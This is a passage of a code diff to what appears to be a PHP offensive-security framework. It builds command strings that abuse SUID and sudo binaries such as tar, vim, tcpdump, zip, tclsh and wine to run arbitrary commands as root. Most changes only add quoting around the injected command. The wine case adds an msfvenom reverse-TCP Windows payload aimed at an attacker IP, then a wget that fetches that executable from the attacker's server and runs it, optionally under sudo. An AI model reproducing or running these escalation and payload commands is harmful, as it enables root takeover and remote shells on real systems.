 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                
-	                $data = "(sleep 5; echo \"! $cmd\"; ) | $this->file_path --shell /bin/sh --command $cmd ";
-	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | sudo $this->file_path --shell /bin/sh --command $cmd";
+	                $data = "(sleep 5; echo \"! $cmd\"; ) | $this->file_path --shell /bin/sh --command '$cmd' ";
+	                $data_sudo = "(sleep 5; echo \"$userpass\" ;sleep 2 ; echo \"! $cmd\"; sleep 3 ) | sudo $this->file_path --shell /bin/sh --command '$cmd'";
 	                
 	                
 	                break;
@@ -2717,24 +2726,24 @@ sh X sh X $cmd ";
 	                 chmod +x $TF
 	                 sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
 	                 */
-	                $data = " \"$via_suid -c $cmd\" ";
+	                $data = " \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 
 	                
 	            case "tar":
 	                // tar xf /dev/null -I '$via_suid  -c "sh <&2 1>&2"'
-	                $data = "$this->file_path -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "taskset":
-	                $data = "$this->file_path 1 $via_suid -c $cmd ";
+	                $data = "$this->file_path 1 $via_suid -c '$cmd' ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "tclsh":// OK lin.Security
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c $cmd\"; sleep 30 ) | socat - EXEC:\"sudo tclsh\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c '$cmd'\"; sleep 30 ) | socat - EXEC:\"sudo tclsh\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2742,70 +2751,71 @@ sh X sh X $cmd ";
 	                break;
 	                
 	            case "tcpdump": // OK webdeveloper
-	                $data_sudo = "COMMAND='$cmd' && TF=\$(mktemp) && echo \"\$COMMAND\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -ln -i lo -w /dev/null -W 1 -G 1 -z \$TF ";
+	                $data = "COMMAND=\"$cmd\" && TF=\\$(mktemp) && echo \"\\\$COMMAND\" > \$TF && chmod +x \\\$TF && $this->file_path -ln -i lo -w /dev/null -W 1 -G 1 -z \\\$TF ";	                
+	                $data_sudo = "COMMAND=\"$cmd\" && TF=\$(mktemp) && echo \"\$COMMAND\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -ln -i lo -w /dev/null -W 1 -G 1 -z \$TF ";
 	                break;
 	                
 	            case "tee":
-	                $data = "\"$via_suid -c $cmd\" ";
+	                $data = "\"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "telnet":
-	                $data = "\"$via_suid -c $cmd\" ";
+	                $data = "\"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "tftp":
-	                $data = "\"$via_suid -c $cmd\" ";
+	                $data = "\"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "time":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "timeout":
-	                $data = "$this->file_path 7d \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path 7d \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "tmux":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 
 	                
 	            case "unexpand":
-	                $data = "$this->file_path -t99999999 \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -t99999999 \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 
 	                
 	            case "unshare":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	                
 	            case "vi": // OK lin.Security
-	                $data = "$this->file_path -c \":! $via_suid -c $cmd\" /etc/profile 2> /dev/null ";
+	                $data = "$this->file_path -c \":! $via_suid -c '$cmd'\" /etc/profile 2> /dev/null ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	                
 	            case "vim":
 	            case "vim.basic":
-	                $data = "$this->file_path -c \":! $via_suid -c $cmd\" ";
+	                $data = "$this->file_path -c \":! $via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	 
 	                
-	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec ".addslashes($via_sudo)." $via_suid -c $cmd\")'";
-	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_sudo $via_suid -c $cmd\")'";
+	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec ".addslashes($via_sudo)." $via_suid -c '$cmd'\")'";
+	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_sudo $via_suid -c '$cmd'\")'";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "watch":
-	                $data = "$this->file_path -x sh -c \"$via_suid -c $cmd 1>&0 2>&0\" ";
+	                $data = "$this->file_path -x sh -c \"$via_suid -c '$cmd' 1>&0 2>&0\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
@@ -2816,26 +2826,32 @@ sh X sh X $cmd ";
 	                 export LFILE=file_to_save
 	                 sudo -E wget $URL -O $LFILE
 	                 */
-	                $data_sudo = "\"$via_suid -c $cmd\" ";
+	                $data_sudo = "\"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "whois":
-	                $data_sudo = "\"$via_suid -c $cmd\" ";
+	                $data_sudo = "\"$via_suid -c '$cmd'\" ";
 	                break;
 	             
 	                
 	            case "wine":
 	                $file_path = "$this->dir_tmp/$sha1_hash.exe";
+	                $obj_file = new FILE($file_path);
+	                $cmd = $this->rev8nc($attacker_ip, $attacker_port, $shell);
+	                $cmd = "id";
+	                // cmd/windows/generic
+	                $query = "msfvenom --payload windows/shell/reverse_tcp LHOST=$attacker_ip LPORT=$attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 1 --format exe -o $obj_file->file_path";
+	                //if (!file_exists($file_path)) $this->requette($query);
+	                //else $this->cmd($attacker_ip,$query);
+	                $this->requette($query);
 	                
-	                $query = "msfvenom --payload windows/exec cmd=\"$cmd\"  LHOST=$attacker_ip LPORT=$attacker_port --arch x86 --platform windows --encoder x86/shikata_ga_nai --iterations 10 --format exe -o $file_path";
-	                if (!file_exists($file_path)) $this->requette($query);
-	                else $this->cmd($attacker_ip,$query);
+	                $query = "file $obj_file->file_path";
+	                $this->requette($query);
 	                
-	               
 	                $this->tcp2open4server($attacker_ip, $this->port_rfi);
 	                
-	                $data = "wget http://$attacker_ip:$this->port_rfi/$file_path -o ./$sha1_hash.exe ; echo '%ID%' > /tmp/req.txt ;$this->file_path ./$sha1_hash.exe <  /tmp/req.txt";
-	                $data_sudo = "wget http://$attacker_ip:$this->port_rfi/$file_path -o ./$sha1_hash.exe ; echo '%ID%' > /tmp/req.txt ;$via_sudo $this->file_path ./$sha1_hash.exe <  /tmp/req.txt ";
+	                $data = "wget http://$attacker_ip:$this->port_rfi/$obj_file->file_name.exe -o ./$sha1_hash.exe ; echo '%ID%' > ./req.txt ;$this->file_path ./$sha1_hash.exe <  ./req.txt";
+	                $data_sudo = "wget http://$attacker_ip:$this->port_rfi/$obj_file->file_name.exe -o ./$sha1_hash.exe ; echo '%ID%' > ./req.txt ;$via_sudo $this->file_path ./$sha1_hash.exe <  ./req.txt ";
 	                break ;
 	                
 	            case "wish":
@@ -2844,33 +2860,33 @@ sh X sh X $cmd ";
 	                 wish
 	                 exec $via_suid  <@stdin >@stdout 2>@stderr
 	                 */
-	                $data_sudo = "\"$via_suid -c $cmd\" ";
+	                $data_sudo = "\"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "xargs":
-	                $data = "$this->file_path -a /dev/null \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -a /dev/null \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 
 	            case "yum":
-	                $data_sudo = "\"$via_suid -c $cmd\" ";
+	                $data_sudo = "\"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "zip":
-	                $data = "$this->file_path /tmp/test.zip /tmp/test -T --unzip-command=\"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path /tmp/test.zip /tmp/test -T --unzip-command=\"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	                
 	            case "zsh": // OK lin.Security
-	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -c \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	                
 	                
 	            case "zypper":
-	                $data = "\"$via_suid -c $cmd\" ";
+	                $data = "\"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	           
